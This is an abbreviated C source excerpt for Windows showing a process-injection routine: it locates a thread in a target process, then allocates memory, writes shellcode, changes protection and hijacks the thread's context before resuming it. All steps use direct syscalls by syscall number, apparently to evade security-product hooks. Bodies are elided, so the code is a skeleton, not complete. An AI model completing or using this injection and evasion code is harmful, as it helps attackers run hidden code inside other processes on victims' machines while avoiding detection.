...
// Function for finding suiNt thread in target process
BOOL GetRemoteThreadHandle(IN PNTAPI_FUNC pNt, IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
	...
	do {
		...
		if (Thr.th32OwnerProcessID == dwProcessId) {
			*dwThreadId = Thr.th32ThreadID;
			...
			PrepareSyscall(pNt->NtOpenThread.dwSSN); 
...
BOOL Inject(IN PNTAPI_FUNC pNt, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSize) {
	...
	PrepareSyscall(pNt->NtAllocateVirtualMemory.dwSSN);
	...
	PrepareSyscall(pNt->NtWriteVirtualMemory.dwSSN);
	...
	PrepareSyscall(pNt->NtProtectVirtualMemory.dwSSN);
	...
	PrepareSyscall(pNt->NtSuspendThread.dwSSN); 
	...
	PrepareSyscall(pNt->NtGetContextThread.dwSSN); 
	...
	PrepareSyscall(pNt->NtSetContextThread.dwSSN); 
	STATUS = RunSyscall(hThread, &ctxThreadContext); 
	if (STATUS != STATUS_SUCCESS) {
	...
	PrepareSyscall(pNt->NtResumeThread.dwSSN); 
	STATUS = RunSyscall(hThread, NULL); 
	if (STATUS != STATUS_SUCCESS) {
...
int main(int argc, char* argv[]) {
	...
	if (!GetRemoteThreadHandle(&Nt, dwPid, &dwTid, &hThread)) {
